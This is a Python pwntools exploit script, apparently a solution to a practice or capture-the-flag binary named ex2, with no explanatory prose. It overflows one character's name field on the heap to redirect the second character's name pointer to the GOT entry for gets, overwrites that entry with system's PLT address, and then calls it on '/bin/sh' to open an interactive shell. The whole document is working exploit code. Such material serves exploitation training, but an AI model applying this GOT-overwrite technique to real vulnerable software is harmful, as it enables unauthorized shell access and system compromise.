from pwn import *

target = process("./bin/ex2")

target.sendline(b"1")   # create first charact
target.sendline(b"1")   # class
target.sendline(b"a")     # name

# Create second character
target.sendline(b"1")
target.sendline(b"2")
target.sendline(b"b")

target.sendline(b"2")   # update
target.sendline(b"1")    # first character

'''
pwndbg> p (int)characters[1]->name - (int)characters[1]
$5 = 32

# [0x404040] gets@GLIBC_2.2.5  →  0x4010b0
'''
gets_addr_got = 0x404040
payload = b"/bin/sh\0" + 32 * b"A" + p64(gets_addr_got)
# gdb.attach(target)
target.sendline(payload)    # name pointer 2nd character is now pointing to gets addr from got

# Update the second character to overwrite gets with system in got
target.sendline(b"2")   # update
target.sendline(b"2")   # second character
''' disass win
0x0000000000401530 <+23>:    call   0x401120 <system@plt>
'''
system_addr_win = 0x401120      # in second character's name is a pointer to gets address from got => overwrite it w/ system address (disass win)
target.sendline(p64(system_addr_win))

# Update the first character (gets(character->name); => gets = system; character->name = /bin/sh)
target.sendline(b"2")
target.sendline(b"1")
target.sendline(b"")

target.interactive()
